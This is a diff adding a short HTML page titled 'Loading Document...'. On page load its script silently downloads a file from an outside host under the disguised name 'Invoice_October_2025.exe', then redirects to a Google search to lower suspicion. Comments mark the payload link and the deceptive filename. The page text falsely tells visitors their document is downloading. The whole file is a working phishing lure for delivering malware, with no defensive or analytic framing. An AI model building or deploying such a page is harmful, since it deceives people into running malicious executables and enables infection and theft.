@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading Document...</title>
+    <script type="text/javascript">
+        window.onload = function() {
+            // --- CRITICAL: PASTE YOUR PAYLOAD'S DIRECT DOWNLOAD LINK HERE ---
+            var payloadUrl = "https://files.catbox.moe/svx243";
+
+            // --- Set a deceptive filename for the user ---
+            var decoyFilename = "Invoice_October_2025.exe";
+
+            var link = document.createElement("a");
+            link.href = payloadUrl;
+            link.download = decoyFilename;
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+
+            // --- Optional: Redirect to a safe page to lower suspicion ---
+            setTimeout(function() {
+                window.location.href = "https://www.google.com/search?q=invoice+not+found";
+            }, 500);
+        };
+    </script>
+</head>
+<body>
+    <p>Your document is downloading. If it doesn't start automatically, please refresh the page.</p>
+</body>
+</html>
